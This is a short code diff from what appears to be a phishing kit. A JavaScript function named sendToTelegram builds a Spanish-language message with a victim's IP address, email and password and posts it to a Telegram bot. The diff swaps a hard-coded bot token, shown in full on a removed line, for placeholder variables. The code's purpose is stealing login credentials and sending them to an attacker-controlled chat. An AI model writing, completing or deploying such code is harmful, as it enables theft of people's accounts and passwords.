@@ -10,8 +10,8 @@ async function sendToTelegram(email, password) {
     • Dirección IP : ${ipv4}\n• Correo: ${email}\n• Contraseña: ${password}
     `;
 
-    const telegramApiKey = '7612746819:AAE5zQpq2HwaanV_843XrKz41bjL82cdcXo';
-    const chatId = '';
+    const telegramApiKey = ${{ TELEGRAM_API_KEY }};
+    const chatId = ${{ TELEGRAM_CHAT_ID }};
     const url = `https://api.telegram.org/bot${telegramApiKey}/sendMessage`;
 
     await fetch(url, {
